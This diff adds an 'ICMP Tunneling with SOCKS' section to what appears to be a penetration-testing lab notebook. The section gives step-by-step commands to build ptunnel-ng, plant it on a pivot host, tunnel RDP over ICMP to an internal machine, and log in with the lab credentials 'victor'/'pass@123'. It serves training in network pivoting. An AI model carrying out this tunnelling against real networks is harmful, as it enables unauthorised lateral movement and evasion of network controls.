@@ -2708,6 +2708,276 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 <details>
 <summary><h2>ICMP Tunneling with SOCKS</h2></summary>
 
+**1. Clone and compile ptunnel-ng statically on the Attack Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+git clone https://github.com/utoni/ptunnel-ng.git
+sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# Cloning into 'ptunnel-ng'...
+# remote: Enumerating objects: 1413, done.
+# remote: Counting objects: 100% (319/319), done.
+# remote: Compressing objects: 100% (137/137), done.
+
+# ...
+
+# /usr/bin/ld: ptunnel_ng-utils.o: in function `host_to_addr':
+#   /home/htb-ac-1640397/ptunnel-ng/src/utils.c:126: warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
+#   /usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/12/../../../x86_64-linux-gnu/libcrypto.a(libcrypto-lib-bio_sock.o): in function `BIO_gethostbyname':
+#   (.text+0x81): warning: Using 'gethostbyname' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
+#   make[2]: Leaving directory '/home/htb-ac-1640397/ptunnel-ng/src'
+#   make[1]: Leaving directory '/home/htb-ac-1640397/ptunnel-ng/src'
+#   make[1]: Entering directory '/home/htb-ac-1640397/ptunnel-ng'
+#   make[1]: Nothing to be done for 'all-am'.
+#   make[1]: Leaving directory '/home/htb-ac-1640397/ptunnel-ng'
+```
+
+</td>
+</tr>
+</table>
+
+**2. Verify that the binary is statically linked**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+ldd src/ptunnel-ng
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# not a dynamic executable
+```
+
+</td>
+</tr>
+</table>
+
+**3. Transfer the binary to the Pivot Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# ubuntu@10.129.202.64's password:
+# output.1 100% 224KB 664.9KB/s 00:00
+# traces.0 100% 53KB 390.8KB/s 00:00
+# traces.1 100% 54KB 399.6KB/s 00:00
+# ...
+# config.log 100% 61KB 450.1KB/s 00:00
+# compile.sh 100% 199 2.9KB/s 00:00
+# ptunnel-ng.te 100% 2019 29.4KB/s 00:00
+```
+
+</td>
+</tr>
+</table>
+
+**4. Connect to the Pivot Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+ssh ubuntu@10.129.202.64
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# ubuntu@10.129.202.64's password:
+# Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+```
+
+</td>
+</tr>
+</table>
+
+**5. Start the ptunnel-ng server on the Pivot Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Linux - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`pivot@host:~$`**
+
+</td>
+<td>
+
+```bash
+sudo ~/ptunnel-ng/src/ptunnel-ng
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# [inf]: Starting ptunnel-ng 1.42.
+# [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+# [inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
+# [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+# [inf]: Forwarding incoming ping packets over TCP.
+# [inf]: Ping proxy is listening in privileged mode.
+# [inf]: Dropping privileges now.
+```
+
+</td>
+</tr>
+</table>
+
+**6. Establish the ICMP tunnel by mapping the remote RDP port**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+sudo ~/ptunnel-ng/src/ptunnel-ng -p10.129.202.64 -l3389 -r172.16.5.19 -R3389
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# [inf]: Starting ptunnel-ng 1.42.
+# [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+# [inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
+# [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+# [inf]: Relaying packets from incoming TCP streams.
+```
+
+</td>
+</tr>
+</table>
+
+**7. Connect via RDP using the local mapped port**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+xfreerdp /v:127.0.0.1 /u:victor /p:pass@123 /cert:ignore
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# [19:53:30:165] [126059:126060] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-1640397/.config/freerdp
+# [19:53:30:165] [126059:126060] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-1640397/.config/freerdp/certs]
+# [19:53:30:165] [126059:126060] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-1640397/.config/freerdp/server]
+```
+
+</td>
+</tr>
+</table>
+
 </details>
 
 </details>
